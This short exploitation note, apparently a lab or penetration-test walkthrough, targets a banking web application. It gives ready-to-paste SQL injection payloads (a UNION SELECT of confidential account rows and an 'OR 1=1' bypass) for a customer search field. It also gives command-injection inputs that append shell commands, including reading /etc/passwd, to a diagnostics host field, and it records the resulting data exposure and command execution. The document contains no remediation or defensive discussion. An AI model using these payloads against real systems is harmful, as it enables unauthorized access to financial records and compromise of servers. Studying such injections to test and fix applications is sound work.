SQL Injection (CWE-89) — Accounts Registry

Target: Navigate to Customer Accounts page and paste into Search field:

' UNION SELECT id, account_number, customer_name, email, account_type, balance, status, is_confidential FROM accounts WHERE is_confidential=1 --
' OR 1=1 --

Result: Bypasses confidential status to expose secret $48.5M offshore reserve and $912M SWIFT Nostro accounts.

Command Injection (CWE-78) — Gateway Diagnostics

Target: Navigate to Gateway Diagnostics and paste into Host field:

127.0.0.1; whoami; id; uname -a
127.0.0.1; cat /etc/passwd | head -n 5

Result: Executes arbitrary operating system shell commands under the web server's privilege level.
